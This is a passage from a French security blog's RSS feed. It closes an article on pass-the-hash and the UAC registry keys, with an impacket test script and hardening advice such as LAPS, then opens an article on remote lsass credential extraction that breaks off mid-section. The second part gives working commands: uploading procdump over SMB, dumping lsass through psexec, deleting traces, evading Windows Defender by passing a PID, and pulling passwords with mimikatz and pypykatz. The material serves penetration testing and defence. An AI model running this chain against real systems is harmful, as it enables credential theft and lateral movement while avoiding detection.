  &lt;li&gt;Soit elles sont demandées par un compte &lt;strong&gt;du domaine&lt;/strong&gt; qui fait partie du groupe “Administrateurs” de la machine, auquel cas l’UAC n’est pas activé pour ce compte, et il peut faire ses tâches d’administration.&lt;/li&gt;
  &lt;li&gt;Soit elles sont demandées par un compte &lt;strong&gt;local&lt;/strong&gt; qui fait partie du groupe “Administrateurs” de la machine, et dans ce cas, l’UAC est activé dans certains cas, mais pas tous.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Pour comprendre le deuxième cas, faisons le point sur deux clés de registre un peu méconnues, mais qui ont pourtant un rôle essentiel lorsque des actions d’administration tentent d’être effectuées suite à une authentification NTLM avec un compte local d’administration.&lt;/p&gt;

&lt;h3 id=&quot;localaccounttokenfilterpolicy&quot;&gt;LocalAccountTokenFilterPolicy&lt;/h3&gt;

&lt;p&gt;Cette première clé de registre se trouve ici dans la base :&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Elle peut avoir deux valeurs, &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; ou &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Par défaut, elle n’est pas présente, ce qui implique qu’elle vaut &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Si elle vaut &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, valeur par défaut donc, alors seul le compte administrateur natif (RID 500) est en mesure d’effectuer des actions d’administration sans que l’UAC ne l’embête. Les autres comptes d’administration, donc ceux créés par les utilisateurs et ensuite ajoutés en tant qu’administrateurs locaux, ne pourront pas faire d’action d’administration à distance puisque l’UAC sera activée, et ils ne pourront pas valider la boite de dialogue à distance.&lt;/li&gt;
  &lt;li&gt;Si elle vaut &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;, alors &lt;strong&gt;tous&lt;/strong&gt; les comptes dans le groupe “Administrateurs” peuvent faire des actions d’administration à distance, natif ou non.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Donc pour résumer, voici les deux cas :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;LocalAccountTokenFilterPolicy = 0&lt;/strong&gt; : Seul le compte “Administrateur” RID 500 peut faire des actions d’administration à distance&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;LocalAccountTokenFilterPolicy = 1&lt;/strong&gt; : Tous les comptes dans le groupe “Administrateurs” peuvent faire des actions d’administration à distance&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;filteradministratortoken&quot;&gt;FilterAdministratorToken&lt;/h3&gt;

&lt;p&gt;Cette deuxième clé de registre se trouve au même endroit dans la base de registre :&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Elle peut également avoir les valeurs &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; ou &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Par défault, elle vaut aussi &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Si elle vaut &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, valeur par défaut donc, alors le compte administrateur natif (RID 500) est en mesure d’effectuer des actions d’administration sans que l’UAC ne l’embête. Cette clé ne concerne pas les autres comptes.&lt;/li&gt;
  &lt;li&gt;Si elle vaut &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;, alors le compte administrateur natif (RID 500) est également soumis à l’UAC, et il n’est plus en mesure d’effectuer des tâches d’administration à distance, &lt;strong&gt;sauf&lt;/strong&gt; si la première clé dont on a parlé vaut &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Donc pour résumer, voici les deux cas :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;FilterAdministratorToken = 0&lt;/strong&gt; : Le compte natif Administrateur peut faire des actions d’administration à distance&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;FilterAdministratorToken = 1&lt;/strong&gt; : Le compte natif Administrateur &lt;strong&gt;ne peut pas&lt;/strong&gt; faire des actions d’administration à distance, sauf si &lt;code class=&quot;highlighter-rouge&quot;&gt;LocalAccountTokenFilterPolicy&lt;/code&gt; vaut &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;résumé&quot;&gt;Résumé&lt;/h3&gt;

&lt;p&gt;Voici un petit tableau résumé. Pour chaque combinaison des deux clés de registre, ce tableau indique si les actions d’administration à distance sont possibles avec un compte administrateur natif et avec un compte administrateur non natif. Les valeurs en gras sont les valeurs par défaut.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;LocalAccountTokenFilterPolicy&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;FilterAdministratorToken&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Administrateuf natif (RID 500)&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Administrateuf non natif&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;0&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;0&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;0&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;0&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Je précise encore une fois que ces informations concernent les actions d’administration. En effet, il est toujours possible de s’authentifier auprès de la machine, quelles que soient les valeurs des clés de registres. Voici un petit programme utilisant la librairie impacket qui permet de comprendre ce point :&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;impacket.smbconnection&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SMBConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SMB_DIALECT&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SMBConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;192.168.1.122&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;192.168.1.122&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
Dans un premier temps, nous nous authentifions en tant que
&quot;Administrateur&quot; sur la machine distante. Une authentification
NTLM va être effectuée, et comme se sont les bonnes informations,
nous serons authentifiés sur la machine distante.
&quot;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Administrateur&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;S3cUr3d+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Logged in !&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Loggon failure&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
Nous nous plaçons dans le cas où :
LocalAccountTokenFilterPolicy = 0
FilterAdministratorToken = 1
D'après le tableau précédant, le compte administrateur natif
n'est pas en mesure d'effectuer des actions d'administration,
telle qu'accéder au partage réseau C$.
&quot;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connectTree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;C$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Access granted !&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Access denied&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si nous le lançons, voici le résultat :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/test_admin_access.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/test_admin_access.png&quot; alt=&quot;Lsassy verification&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Cela confirme bien que l’authentification a fonctionné, mais que le contexte d’administration demandé a été refusé puisque l’UAC est activé pour le compte, puisqu’imposé par la clé &lt;strong&gt;FilterAdministratorToken&lt;/strong&gt; dans cet exemple.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;L’authentification NTLM est aujourd’hui encore beaucoup utilisée en entreprise. D’expérience, je n’ai encore jamais vu d’environnement ayant réussi à désactiver NTLM sur l’ensemble de son parc. La technique du Pass the hash reste donc très efficace.&lt;/p&gt;

&lt;p&gt;Cette technique est inhérente au protocole NTLM, cependant il est possible de limiter les dégats en évitant d’avoir le même mot de passe d’administration locale sur tous les postes. La solution &lt;a href=&quot;https://blogs.technet.microsoft.com/arnaud/2015/11/25/local-admin-password-solution-laps/&quot;&gt;LAPS&lt;/a&gt; de Microsoft est une solution parmi d’autres pour gérer automatiquement les mots de passe des administrateurs en faisant en sorte que ce mot de passe (donc aussi le hash NT) soit différent sur tous les postes.&lt;/p&gt;

&lt;p&gt;Par ailleurs, mettre en place une &lt;a href=&quot;https://www.sstic.org/media/SSTIC2017/SSTIC-actes/administration_en_silo/SSTIC2017-Article-administration_en_silo-bordes.pdf&quot;&gt;administration en SILO&lt;/a&gt; permet d’éviter les élévations de privilèges au sein du système d’information. Des administrateurs dédiés à des zones de criticité différentes (bureautique, serveur, contrôleurs de domaine, …) se connectent uniquement sur leur zone, et ne peuvent pas accéder à une zone différente. Si ce type d’administration est mise en place et qu’une machine d’une zone est compromise, l’attaquant ne pourra pas utiliser les identifiants trouvés pour atteindre une autre zone.&lt;/p&gt;

&lt;p&gt;Enfin, bien positionner les clés de registre dont nous avons parlé dans le dernier paragraphe permet de limiter les actions des administrateurs.&lt;/p&gt;

&lt;p&gt;Une partie de ces recommandations est indiquée dans le &lt;a href=&quot;https://www.ssi.gouv.fr/uploads/2017/01/guide_hygiene_informatique_anssi.pdf&quot;&gt;Guide d’hygiène informatique&lt;/a&gt; publié par l’ANSSI.&lt;/p&gt;

&lt;p&gt;En attendant, cette technique a encore de beaux jours devant elle !&lt;/p&gt;

&lt;p&gt;Si vous avez des questions, n’hésitez pas à les poser ici ou sur &lt;a href=&quot;https://discord.gg/9At6SUZ&quot;&gt;Discord&lt;/a&gt; et je me ferai une joie de tenter d’y répondre. De la même manière, si vous voyez des coquilles, je suis tout ouïe. A la prochaine !&lt;/p&gt;
</description>
        <pubDate>Wed, 18 Dec 2019 00:01:21 +0100</pubDate>
        <link>http://localhost:4000//pass-the-hash/</link>
        <guid isPermaLink="true">http://localhost:4000//pass-the-hash/</guid>
        
        <category>Active Directory</category>
        
        <category>Windows</category>
        
        
      </item>
    
      <item>
        <title>Extraction des secrets de lsass à distance</title>
        <description>&lt;p&gt;Lors de tests d’intrusion en entreprise, le mouvement latéral et l’élévation de privilèges sont deux concepts fondamentaux pour avancer et prendre le contrôle de la cible. Il existe une multitude de moyens de faire l’un ou l’autre, mais aujourd’hui nous allons présenter une nouvelle technique pour lire le contenu d’un dump de lsass à distance, diminuant significativement la latence et la détection lors de l’extraction de mots de passe sur un ensemble de machines.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;Un petit message d’introduction pour remercier &lt;a href=&quot;https://twitter.com/mpgn_x64&quot;&gt;mpgn&lt;/a&gt; qui m’a beaucoup aidé sur différents sujets, et avec qui je travaille en partie sur ce projet, et &lt;a href=&quot;https://twitter.com/skelsec&quot;&gt;Skelsec&lt;/a&gt; pour ses conseils et ses idées.&lt;/p&gt;

&lt;h2 id=&quot;crackmapexec&quot;&gt;CrackMapExec&lt;/h2&gt;

&lt;p&gt;L’outil &lt;a href=&quot;https://github.com/byt3bl33d3r/CrackMapExec&quot;&gt;CrackMapExec&lt;/a&gt; est développé et maintenu par &lt;a href=&quot;https://twitter.com/byt3bl33d3r&quot;&gt;Byt3bl33d3r&lt;/a&gt;. Son utilité est de pouvoir exécuter des actions sur un ensemble de machines de manière asynchrone, donc relativement rapidement. L’outil permet de s’authentifier sur les machines distantes avec un compte de domaine, un compte local, et un password ou un hash, donc via la technique de “Pass the hash”.&lt;/p&gt;

&lt;p&gt;CrackMapExec a été développé de manière modulaire. Il est possible de créer ses propres modules que l’outil exécutera lorsqu’il se connectera à une machine. Il en existe déjà beaucoup, comme l’énumération d’informations (DNS, Chrome, AntiVirus), l’exécution de BloodHound ou encore la recherche de mots de passe dans les “Group Policy Preferences”.&lt;/p&gt;

&lt;h2 id=&quot;module-mimikatz&quot;&gt;Module Mimikatz&lt;/h2&gt;

&lt;p&gt;Il en existe un en particulier, qui était très efficace pendant quelques temps, c’était le module &lt;a href=&quot;https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/modules/mimikatz.py&quot;&gt;Mimikatz&lt;/a&gt;. CrackMapExec exécute Mimikatz sur les machines distantes afin d’extraire les identifiants de la mémoire de lsass ou &lt;strong&gt;Local Security Authority SubSystem&lt;/strong&gt;. C’est dans ce processus que se trouvent les différents &lt;strong&gt;Security Service Providers&lt;/strong&gt; ou &lt;strong&gt;SSP&lt;/strong&gt;, c’est à dire les paquets qui gèrent les différents types d’authentification. Pour des raisons pratiques, les identifiants entrés par un utilisateur sont très souvent enregistrés dans l’un de ces paquets pour qu’il n’ait pas à les entrer une nouvelle fois quelques secondes ou minutes plus tard.&lt;/p&gt;

&lt;p&gt;C’est pourquoi Mimikatz extrait les informations situées dans ces différents SSP pour tenter de trouver des secrets d’identification, et les affiche à l’attaquant. Ainsi, si un compte à privilèges s’est connecté sur l’une des machines compromises, le module Mimikatz permet de récupérer rapidement ses identifiants et ainsi profiter des privilèges de ce compte pour compromettre plus de ressources.&lt;/p&gt;

&lt;p&gt;Mais aujourd’hui, la majorité des antivirus détecte la présence et/ou l’exécution de Mimikatz et le bloque. CrackMapExec a beau attendre une réponse des machines visées, l’antivirus a joué son rôle, et nous n’avons plus les secrets qui apparaissent sur notre écran.&lt;/p&gt;

&lt;h2 id=&quot;méthode-manuelle--procdump&quot;&gt;Méthode manuelle : Procdump&lt;/h2&gt;

&lt;p&gt;Suite à ce constat, je me suis tourné vers une méthode beaucoup plus manuelle mais qui a le mérite d’être fonctionnelle en utilisant l’outil &lt;a href=&quot;https://docs.microsoft.com/en-us/sysinternals/downloads/procdump&quot;&gt;Procdump&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Procdump est un outil de la suite &lt;a href=&quot;https://docs.microsoft.com/en-us/sysinternals/&quot;&gt;Sysinternals&lt;/a&gt; qui a été écrite par &lt;a href=&quot;https://blogs.technet.microsoft.com/markrussinovich/&quot;&gt;Marc Russinovich&lt;/a&gt; pour simplifier la vie des administrateurs. Cette suite d’outils a été adoptée par un grand nombre de personnes, à tel point que Microsoft a décidé de l’acheter vers 2006, et les exécutables sont maintenant signés par Microsoft, donc reconnus comme sains par Windows.&lt;/p&gt;

&lt;p&gt;L’outil procdump fait donc partie de ces outils, et il permet tout simplement de faire un dump de la mémoire d’un processus en cours d’exécution. Il s’attache au processus, lit sa mémoire et la retranscrit dans un fichier.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;procdump --accepteula -ma &amp;lt;processus&amp;gt; processus_dump.dmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Or, pour extraire les secrets des utilisateurs, Mimikatz va notamment fouiller dans la mémoire du processus &lt;strong&gt;lsass&lt;/strong&gt;, comme expliqué précédemment.&lt;/p&gt;

&lt;p&gt;Il est alors possible de faire un dump du processus lsass sur une machine, de rapatrier ce dump sur notre machine locale, et d’extraire les identifiants à l’aide de Mimikatz.&lt;/p&gt;

&lt;p&gt;Pour dumper le processus lsass, nous pouvons donc utiliser l’outil procdump, puisque celui-ci est connu de Windows, et ne sera pas considéré comme un logiciel malveillant.&lt;/p&gt;

&lt;p&gt;Dans un premier temps, il faut l’envoyer sur le serveur, par exemple en utilisant &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient.py&lt;/code&gt; de la suite &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;impacket&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/put_procdump.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/put_procdump.png&quot; alt=&quot;Put Procdump&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient.py ADSEC.LOCAL/jsnow@DC01.adsec.local
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# use C$
# cd Windows
# cd Temp
# put procdump.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Une fois uploadé, il doit être exécuté afin de créer le dump de lsass.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/execute_procdump.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/execute_procdump.png&quot; alt=&quot;Excute Procdump&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;psexec.py adsec.local/jsnow@DC01.adsec.local &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Temp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;procdump.exe -accepteula -ma lsass C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Temp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;lsass.dmp&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Puis le dump doit être rapatrié sur la machine de l’attaquant, suite à quoi nous pouvons supprimer les traces sur la cible (lsass.dmp et procdump.exe).&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/get_procdump.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/get_procdump.png&quot; alt=&quot;Get Procdump&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# get lsass.dmp
# del procdump.exe
# del lsass.dmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;L’extraction des identifiants se fait de la manière suivante avec Mimikatz : la première ligne permet de charger le dump mémoire, et la deuxième d’extraire les secrets.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/mimikatz_dump.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/mimikatz_dump.png&quot; alt=&quot;Mimikatz Dump&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cette technique est très pratique puisqu’elle ne génère pas beaucoup de bruit et seul un logiciel légitime est utilisé sur les cibles.&lt;/p&gt;

&lt;h2 id=&quot;limites--améliorations&quot;&gt;Limites &amp;amp; Améliorations&lt;/h2&gt;

&lt;p&gt;Il existe différentes limitations à cette méthode. Nous allons les exposer ici, et proposer des améliorations afin d’y remédier.&lt;/p&gt;

&lt;h3 id=&quot;linux--windows&quot;&gt;Linux / Windows&lt;/h3&gt;

&lt;p&gt;Le premier problème est que lors de mes tests, je suis majoritairement sur mon poste Linux, que ce soit pour les tests web ou les tests internes, et Mimikatz est un outil exclusivement développé pour Windows, de par son fonctionnement. Il serait idéal de pouvoir effectuer la chaine d’attaque décrite ci-dessus depuis un poste Linux.&lt;/p&gt;

&lt;p&gt;Heureusement, le projet &lt;a href=&quot;https://github.com/skelsec/pypykatz&quot;&gt;Pypykatz&lt;/a&gt; de &lt;a href=&quot;https://twitter.com/skelsec&quot;&gt;Skelsec&lt;/a&gt; répond à cette attente. Skelsec a développé une implémentation partielle de Mimikatz en python pur. Qui dit python pur, dit cross-plateforme. Cet outil permet notamment, comme Mimikatz, d’extraire les secrets d’un dump lsass.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/pypykatz_example.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/pypykatz_example.png&quot; alt=&quot;Pypykatz Example&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pypykatz lsa minidump lsass.dmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Grâce à ce projet, il est possible de tout faire depuis une machine Linux. L’ensemble des étapes présentées dans le paragraphe précédent est applicable, et lorsque lsass.dmp a été téléchargé sur la machine de l’attaquant, pypykatz est utilisé pour extraire les noms d’utilisateur et mots de passe ou hash NT de ce dump.&lt;/p&gt;

&lt;p&gt;So far so good, let’s go deeper.&lt;/p&gt;

&lt;h3 id=&quot;windows-defender&quot;&gt;Windows Defender&lt;/h3&gt;

&lt;p&gt;Une deuxième limitation a été rencontrée, elle était due à Windows Defender. Bien que procdump soit un outil de confiance du point de vue de Windows, le fait de faire un dump de lsass est un comportement qui est considéré comme anormal par Windows Defender. Ainsi, lorsque le dump a été effectué, Windows Defender réagit et supprime le dump après quelques secondes. Si nous avons une très bonne connexion, que le dump n’est pas trop gros, et que nous sommes suffisamment rapides, il est possible de télécharger le dump avant sa suppression.&lt;/p&gt;

&lt;p&gt;Cependant ce comportement est trop aléatoire pour s’en contenter. En regardant la documentation de procdump, je me suis rendu compte qu’il était aussi possible de lui fournir un identifiant de process (PID). Et surprise, en lui fournissant non plus le nom mais le PID de lsass, Windows Defender ne réagit plus.&lt;/p&gt;

&lt;p&gt;Il suffit alors de trouver le PID du processus lsass, par exemple avec la commande &lt;code class=&quot;highlighter-rouge&quot;&gt;tasklist&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; tasklist /fi &quot;imagename eq lsass.exe&quot;

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
lsass.exe                      640 Services                   0     15,584 K
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Puis une fois en possession de ce PID, nous le fournissons à procdump.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;procdump -accepteula -ma 640 lsass.dmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous avons alors tout le loisir de télécharger notre dump et de l’analyser ensuite sur notre machine, comme précédemment.&lt;/p&gt;

&lt;h3 id=&quot;méthode-manuelle&quot;&gt;Méthode manuelle&lt;/h3&gt;

&lt;p&gt;Cette opération est certes pratique, mais elle reste manuelle. Nous avons parlé de CrackMapExec et de sa modularité au début de cet article, c’est pourquoi j’ai écrit un module permettant d’automatiser cette opération. Pour chaque cible fournie à CrackMapExec, si l’attaquant est administrateur local de la cible, le module va uploader procdump sur la cible, l’exécuter, récupérer le dump de lsass et va ensuite l’analyser avec pypykatz.&lt;/p&gt;

&lt;p&gt;Ce module fonctionne bien, mais il est long, très long à s’exécuter, et parfois le téléchargement du dump de lsass ne se termine pas car le fichier est trop volumineux. Il s’agit alors d’optimiser ce module.&lt;/p&gt;

&lt;h3 id=&quot;taille-dun-dump&quot;&gt;Taille d’un dump&lt;/h3&gt;

